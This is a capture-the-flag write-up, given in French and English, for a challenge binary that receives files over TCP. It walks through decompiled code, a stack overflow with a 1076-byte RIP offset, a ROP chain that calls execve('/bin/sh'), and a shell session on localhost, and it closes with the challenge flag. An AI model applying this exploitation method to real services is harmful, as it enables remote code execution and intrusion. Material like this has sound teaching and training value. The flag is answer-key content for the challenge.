# Shared file

## Write-up FR

On dispose de deux fichiers, client et server, qui sont tous deux des exécutables ELF x86_64, sans canary, avec NX activé et sans PIE.
Si on exécute server et client, on constate que ces programmes échangent un fichier via TCP.

Nous allons donc analyser leurs fonctionnements à l'aide de Ghidra/IDA.
Voici le main du client : 
```c
bool FUN_00401d71(int param_1,undefined8 *param_2)

{
  undefined4 uVar1;
  
  if (param_1 == 3) {
    uVar1 = FUN_00401a85(param_2[1]);
    FUN_00401b62(uVar1,param_2[2]);
    FUN_00421780(uVar1);
  }
  else {
    FUN_00405250(_DAT_004b36c8,&UNK_00487088,*param_2);
  }
  return param_1 != 3;
}
```

La fonction FUN_00401a85 établit une connexion TCP avec le serveur.
Ensuite, FUN_00401b62 envoie un fichier au serveur en transmettant les données suivantes :
- La taille du fichier suivie d'un saut de ligne (\n).
- Le contenu du fichier.

Cependant, si la taille du fichier dépasse `0x400` octets, l'envoi est annulé et le programme se termine.

Voici le main du server :
```c
undefined8 FUN_00401cf2(void)

{
  undefined4 uVar1;
  undefined4 uVar2;
  
  uVar1 = FUN_00401975(0x115c);
  uVar2 = FUN_00401a9f(uVar1);
  FUN_00401cba(uVar2);
  FUN_0041d860(uVar1);
  return 0;
}
```

La fonction `FUN_00401975(0x115c)` met en écoute un serveur TCP sur le port 4444. Comme le challenge mentionne ce port, on peut en déduire que c'est bien server qui tourne dessus.
La fonction `FUN_00401a9f` attend une connexion d'un client, puis effectue dup2 pour rediriger STDIN, STDOUT et STDERR vers le fd du client.

Nous allons maintenant examiner la fonction `FUN_00401cba`, qui prend en paramètre le fd du client : 
```c
void FUN_00401cba(undefined4 param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00401b37(param_1);
  FUN_00401be8(param_1,uVar1);
  FUN_0041d860(param_1);
  return;
}
```
La fonction `FUN_00401b37` récupère via TCP la taille du fichier que le serveur doit recevoir. Aucun dépassement de tampon n'est présent à ce niveau.

La fonction `FUN_00401be8` reçoit la taille du fichier et le fd du client en paramètres. Cette fonction :
- Lit size octets de données envoyées par le client.
- Stocke ces données dans un buffer fixe de 0x400 octets.
- Écrit ces données dans un fichier secret.txt.

Si la taille indiquée dépasse `0x400`, un buffer overflow se produit.

Nous allons envoyer une taille supérieure à `0x400` (par exemple `1300` octets) avec un payload nous permettant de contrôler `RIP`.
En testant, nous déterminons que l'offset nécessaire pour écraser `RIP` est `1076` octets.

Étant donné que PIE est désactivé, nous pouvons construire une ROP chain.
De plus, dup2 ayant redirigé les entrées/sorties vers le client, il ne nous reste plus qu'à faire apparaître un shell.

Nous devons donc disposer des gadgets suivants :
- pop rdx
- pop rax
- pop rdi
- pop rsi
- syscall
- mov qword ptr [reg1], reg2

Par chance, tous ces gadgets sont présents.

Nous allons d'abord placer "/bin/sh" à une adresse contrôlée :
- pop rdx
- "/bin/sh\x00"
- pop rdi
- 0x4b2000
- mov qword ptr [rdi], rdx

Ensuite, nous allons faire execve("/bin/sh", NULL, NULL) :
- pop rax → 0x3b (numéro de syscall pour execve)
- pop rdi → 0x4b2000 (adresse de "/bin/sh")
- pop rsi → 0x0 (argv = NULL)
- pop rdx → 0x0 (envp = NULL)
- syscall


```bash
$ python sol.py 
[+] Opening connection to localhost on port 4444: Done
[*] Switching to interactive mode
$ ls
/bin/sh: 1: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDls: not found
$ whoami
user
```

## Write-up EN
We have two files, `client` and `server`, both of which are ELF x86_64 executables with no canary, NX enabled, and no PIE.

When executing `server` and `client`, we observe that these programs exchange a file over TCP.

We will analyze their behavior using Ghidra/IDA.

Here is the main function of the client :
```c
bool FUN_00401d71(int param_1,undefined8 *param_2)

{
  undefined4 uVar1;
  
  if (param_1 == 3) {
    uVar1 = FUN_00401a85(param_2[1]);
    FUN_00401b62(uVar1,param_2[2]);
    FUN_00421780(uVar1);
  }
  else {
    FUN_00405250(_DAT_004b36c8,&UNK_00487088,*param_2);
  }
  return param_1 != 3;
}
```
The function `FUN_00401a85` establishes a TCP connection with the server.
Then, `FUN_00401b62` sends a file to the server by transmitting the following data:

- The file size followed by a newline (\n).
- The file content.

However, if the file size exceeds `0x400` bytes, the transfer is aborted, and the program terminates.
Here is the main function of the server :
```c
undefined8 FUN_00401cf2(void)

{
  undefined4 uVar1;
  undefined4 uVar2;
  
  uVar1 = FUN_00401975(0x115c);
  uVar2 = FUN_00401a9f(uVar1);
  FUN_00401cba(uVar2);
  FUN_0041d860(uVar1);
  return 0;
}
```
The function `FUN_00401975(0x115c)` sets up a TCP server listening on port 4444. Since the challenge specifies this port, we can deduce that server is running on it.
`FUN_00401a9f` waits for a client connection and then performs dup2 to redirect STDIN, STDOUT, and STDERR to the client's fd.
Now, let's examine the function `FUN_00401cba`, which takes the client's fd as a parameter : 
```c
void FUN_00401cba(undefined4 param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00401b37(param_1);
  FUN_00401be8(param_1,uVar1);
  FUN_0041d860(param_1);
  return;
}
```
`FUN_00401b37` retrieves the file size that the server should receive via TCP. There is no buffer overflow at this stage.
`FUN_00401be8` takes the file size and the client's fd as parameters. This function:
- Reads size bytes of data sent by the client.
- Stores the data in a fixed-size `0x400` buffer.
- Writes this data to a file named secret.txt.

If the specified size exceeds `0x400`, a buffer overflow occurs.

We will send a size greater than `0x400` (e.g., `1300` bytes) with a payload allowing us to control `RIP`.
By testing, we determine that the offset needed to overwrite `RIP` is `1076` bytes.
Since PIE is disabled, we can construct a ROP chain.

Moreover, since dup2 has redirected the input/output to the client, all that remains is to spawn a shell.

We therefore need the following gadgets:
- pop rdx
- pop rax
- pop rdi
- pop rsi
- syscall
- mov qword ptr [reg1], reg2

Fortunately, all these gadgets are present.

We will first place "/bin/sh" at a controlled address:
- pop rdx
- "/bin/sh\x00"
- pop rdi
- 0x4b2000
- mov qword ptr [rdi], rdx

Next, we will execute execve("/bin/sh", NULL, NULL):
- pop rax → 0x3b (syscall number for execve)
- pop rdi → 0x4b2000 (address of "/bin/sh")
- pop rsi → 0x0 (argv = NULL)
- pop rdx → 0x0 (envp = NULL)
- syscall

```bash
$ python sol.py 
[+] Opening connection to localhost on port 4444: Done
[*] Switching to interactive mode
$ ls
/bin/sh: 1: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDls: not found
$ whoami
user
```

## Flag

`polycyber{r3b3l_c0mm_pr0gr4m_0wn3d}`